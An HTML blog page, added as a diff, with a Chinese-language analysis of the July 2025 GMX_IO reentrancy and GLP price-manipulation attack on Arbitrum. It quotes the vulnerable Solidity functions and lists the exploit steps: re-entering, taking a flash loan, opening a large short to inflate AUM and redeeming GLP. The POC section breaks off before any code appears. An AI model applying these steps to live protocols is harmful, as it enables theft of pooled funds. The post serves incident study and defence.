@@ -1,0 +1,1200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Chiu">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set data attribute for CSS variables
+                root.setAttribute("data-theme", theme);
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes once DOM is ready
+            if (document.readyState !== "loading") {
+                document.body.classList.add(theme + "-mode");
+            } else {
+                document.addEventListener("DOMContentLoaded", () => {
+                    document.body.classList.add(theme + "-mode");
+                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
+                });
+            }
+        })();
+    </script>
+    
+    <!-- Critical CSS to prevent flash -->
+    <style>
+        :root[data-theme="dark"] {
+            --background-color: #202124;
+            --background-color-transparent: rgba(32, 33, 36, 0.6);
+            --second-background-color: #2d2e32;
+            --third-background-color: #34353a;
+            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #ffffff;
+            --second-text-color: #eeeeee;
+            --third-text-color: #bebec6;
+            --fourth-text-color: #999999;
+            --default-text-color: #bebec6;
+            --invert-text-color: #373D3F;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(255, 255, 255, 0.08);
+            --shadow-color-2: rgba(255, 255, 255, 0.05);
+        }
+        
+        :root[data-theme="light"] {
+            --background-color: #fff;
+            --background-color-transparent: rgba(255, 255, 255, 0.6);
+            --second-background-color: #f8f8f8;
+            --third-background-color: #f2f2f2;
+            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #16171a;
+            --second-text-color: #2f3037;
+            --third-text-color: #5e5e5e;
+            --fourth-text-color: #eeeeee;
+            --default-text-color: #373D3F;
+            --invert-text-color: #bebec6;
+            --border-color: rgba(0, 0, 0, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(0, 0, 0, 0.08);
+            --shadow-color-2: rgba(0, 0, 0, 0.05);
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+        
+        /* Apply body classes as soon as DOM is ready */
+        :root[data-theme="dark"] body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+    </style>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/07/12/gmx_io_incident/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="1. 背景简介25年7月9日，Arbitrum 平台上的去中心化永续合约交易协议 GMX_IO 被攻击，攻击者利用退款逻辑中的重入漏洞劫持控制流，并通过GLP代币定价机制中的计算缺陷操控代币价格，从Vault攫取了大量利润 2. 漏洞根本原因分析2.1 Root causePositionManager.executeDecreaseOrder() 函数隐式假设_account为EOA，但实际可以">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GMX_IO Incident analysis &amp; POC">
+<meta property="og:url" content="http://example.com/2025/07/12/GMX_IO_Incident/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="1. 背景简介25年7月9日，Arbitrum 平台上的去中心化永续合约交易协议 GMX_IO 被攻击，攻击者利用退款逻辑中的重入漏洞劫持控制流，并通过GLP代币定价机制中的计算缺陷操控代币价格，从Vault攫取了大量利润 2. 漏洞根本原因分析2.1 Root causePositionManager.executeDecreaseOrder() 函数隐式假设_account为EOA，但实际可以">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-07-12T08:33:43.000Z">
+<meta property="article:modified_time" content="2025-07-22T08:38:51.014Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="区块链">
+<meta property="article:tag" content="DeFi">
+<meta property="article:tag" content="攻击事件分析">
+<meta name="twitter:card" content="summary">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            GMX_IO Incident analysis &amp; POC | Chiu&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+        
+<script src="/js/build/libs/anime.min.js"></script>
+
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Input | Think | Output","subtitle":{"text":["How you spend every day is how you spend your life"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/Idealist17","instagram":null,"zhihu":null,"twitter":null,"email":"ChiuFangxi@gmail.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.8.4","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Gallery":{"icon":"fa-solid fa-image","path":"/masonry/"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Friends":"/friends"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"Input | Think | Output","show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/7/30 14:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":true};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    <h2 class="ml13">
+        Chiu&#39;s Blog
+    </h2>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+        var animation = anime.timeline({ loop: true })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [20, 0],
+                translateZ: 0,
+                opacity: [0, 1],
+                filter: ['blur(5px)', 'blur(0px)'],
+                easing: "easeOutExpo",
+                duration: 1200,
+                delay: (el, i) => 300 + 20 * i,
+            })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [0, -20],
+                opacity: [1, 0],
+                filter: ['blur(0px)', 'blur(5px)'],
+                easing: "easeInExpo",
+                duration: 1000,
+                delay: (el, i) => 15 * i,
+                complete: function() {
+                    hidePreloader();
+                }
+            }, '-=700');
+
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
+        });
+
+        function hidePreloader() {
+            var preloader = document.querySelector('.preloader');
+            preloader.style.opacity = '0';
+            setTimeout(function () {
+                preloader.style.display = 'none';
+            }, 200);
+        }
+    </script>
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Chiu&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/masonry/"
+                                        >
+                                    <i class="fa-solid fa-image fa-fw"></i>
+                                    GALLERY
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    ABOUT
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/about">
+                                                    ME
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="/friends">
+                                                    FRIENDS
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/masonry/"
+                        >
+                            <span>
+                                GALLERY
+                            </span>
+                            
+                                <i class="fa-solid fa-image fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-About"
+                        >
+                            <span>
+                                ABOUT
+                            </span>
+                            
+                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/about">ME</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/friends">FRIENDS</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/tags"
+                        >
+                            <span>Tags</span>
+                            <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">22</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">35</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">GMX_IO Incident analysis &amp; POC</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/redefine-avatar.svg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Chiu</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-07-12 16:33:43</span>
+        <span class="mobile">2025-07-12 16:33:43</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-07-22 16:38:51</span>
+            <span class="mobile">2025-07-22 16:38:51</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/">区块链</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/DeFi/">DeFi</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/">攻击事件分析</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h2 id="1-背景简介"><a href="#1-背景简介" class="headerlink" title="1. 背景简介"></a>1. 背景简介</h2><p>25年7月9日，Arbitrum 平台上的去中心化永续合约交易协议 GMX_IO 被攻击，攻击者利用退款逻辑中的重入漏洞劫持控制流，并通过GLP代币定价机制中的计算缺陷操控代币价格，从Vault攫取了大量利润</p>
+<h2 id="2-漏洞根本原因分析"><a href="#2-漏洞根本原因分析" class="headerlink" title="2. 漏洞根本原因分析"></a>2. 漏洞根本原因分析</h2><h3 id="2-1-Root-cause"><a href="#2-1-Root-cause" class="headerlink" title="2.1 Root cause"></a>2.1 Root cause</h3><p><code>PositionManager.executeDecreaseOrder()</code> 函数隐式假设_account为EOA，但实际可以将合约地址导入rabby 钱包来伪装EOA，导致ETH退款逻辑可触发重入</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">function executeDecreaseOrder(address _account, uint256 _orderIndex, address payable _feeReceiver) external onlyOrderKeeper &#123;</span><br><span class="line">      address _vault = vault;</span><br><span class="line">      address timelock = IVault(_vault).gov();</span><br><span class="line"></span><br><span class="line">      (</span><br><span class="line">          address collateralToken,</span><br><span class="line">          /*uint256 collateralDelta*/,</span><br><span class="line">          address indexToken,</span><br><span class="line">          uint256 sizeDelta,</span><br><span class="line">          bool isLong,</span><br><span class="line">          /*uint256 triggerPrice*/,</span><br><span class="line">          /*bool triggerAboveThreshold*/,</span><br><span class="line">          /*uint256 executionFee*/</span><br><span class="line">      ) = IOrderBook(orderBook).getDecreaseOrder(_account, _orderIndex);</span><br><span class="line"></span><br><span class="line">      uint256 markPrice = isLong ? IVault(_vault).getMinPrice(indexToken) : IVault(_vault).getMaxPrice(indexToken);</span><br><span class="line">      // should be called strictly before position is updated in Vault</span><br><span class="line">      IShortsTracker(shortsTracker).updateGlobalShortData(_account, collateralToken, indexToken, isLong, sizeDelta, markPrice, false);</span><br><span class="line"></span><br><span class="line">      //只会在execute的时候将leverage打开</span><br><span class="line">      ITimelock(timelock).enableLeverage(_vault);</span><br><span class="line">      //此处存在reentrancy，在禁用leverage之前去调用Vault.increasePosition()开杠杆空头仓操控AUM</span><br><span class="line">      IOrderBook(orderBook).executeDecreaseOrder(_account, _orderIndex, _feeReceiver);</span><br><span class="line">		</span><br><span class="line">		//禁用杠杆，防止直接调用Vault</span><br><span class="line">      ITimelock(timelock).disableLeverage(_vault);</span><br><span class="line"></span><br><span class="line">      _emitDecreasePositionReferral(_account, sizeDelta);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="2-2-Contributing-factors-："><a href="#2-2-Contributing-factors-：" class="headerlink" title="2.2 Contributing factors ："></a>2.2 Contributing factors ：</h3><p><code>GlpManager.sol</code> 处理杠杆仓位时，计算<code>AUM</code>的逻辑存在缺陷</p>
+<p>（<code>AUM</code>用于在<code>GLP</code>赎回过程中计算每个<code>GLP</code>对应的价值）<br>通过重入首次开空头仓时，仓位<code>size</code>会立即更新，但<code>averageShortPrice</code>更新滞后，导致系统认为开仓的价格为未更新的低价，所以仓位的未实现亏损被计入<code>AUM</code>（ Vault为所有交易者的对手方，交易者亏钱Vault赚钱）</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function getAum(bool maximise) public view returns (uint256) &#123;</span><br><span class="line">    ...</span><br><span class="line">    uint256 price = maximise ? vault.getMaxPrice(token) : vault.getMinPrice(token);</span><br><span class="line">    ...</span><br><span class="line">    uint256 size = _vault.globalShortSizes(token);</span><br><span class="line"></span><br><span class="line">    if (size &gt; 0) &#123;</span><br><span class="line">        (uint256 delta, bool hasProfit) = getGlobalShortDelta(token, price, size);</span><br><span class="line">        if (!hasProfit) &#123;</span><br><span class="line">            aum = aum.add(delta); // 未实现盈亏被计入AUM</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            shortProfits = shortProfits.add(delta);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="2-3-漏洞利用"><a href="#2-3-漏洞利用" class="headerlink" title="2.3 漏洞利用"></a>2.3 漏洞利用</h3><ol>
+<li>调用<code>OrderBook.createIncreaseOrder()</code>建仓，然后调用<code>OrderBook.createDecreaseOrder()</code>减仓触发重入</li>
+<li>重入状态下，杠杆为开启状态，<code>fallback()</code>函数中：<ol>
+<li>借闪电贷</li>
+<li>一部分贷来的USDC用于铸造GLP，待价格操控后赎回资产</li>
+<li>另一部分贷来的USDC用于直接调用<code>Vault.increasePosition()</code>开大额空头仓</li>
+<li>上述漏洞原因，AUM上涨，导致GLP价格被高估，此时用GLP赎回超额资产</li>
+</ol>
+</li>
+</ol>
+<h2 id="3-POC"><a href="#3-POC" class="headerlink" title="3. POC"></a>3. POC</h2><p>需要自己prank keeperBot的身份去执行订单</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 